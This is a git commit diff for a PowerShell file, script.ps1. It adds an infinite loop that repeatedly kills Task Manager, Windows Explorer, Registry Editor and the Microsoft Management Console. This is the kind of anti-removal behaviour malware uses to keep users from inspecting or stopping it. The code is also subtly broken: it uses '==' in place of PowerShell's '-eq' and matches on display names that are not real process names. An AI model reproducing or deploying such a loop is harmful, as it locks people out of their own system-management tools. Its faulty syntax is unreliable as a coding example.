a2dfc999fc4139426d5bfcc45be47afb7ddb07a2
Full-Frost <50626696+Full-Frost@users.noreply.github.com>
2021-10-17 16:37:00 -0400

    done

--- script.ps1
+++ script.ps1
@@ -1,4 +1,8 @@
-$runningProcesses = (Get-Service | Where-Object Status -eq "Running").Count
-for($i = 0; $i - $runningProcesses; $i++){
-
+while($true){
+    $runningProcesses = get-process 
+    foreach ($process in $runningProcesses) {
+    if(($process == (get-process -Name 'Task Manager')) -Or ($process == (get-process -Name 'Windows Explorer')) -Or ($process == (get-process -Name 'Registry Editor')) -Or ($process == (get-process -Name 'Microsoft Management Console'))){
+        Stop-Process -InputObject $process
+        }
+    }
 }
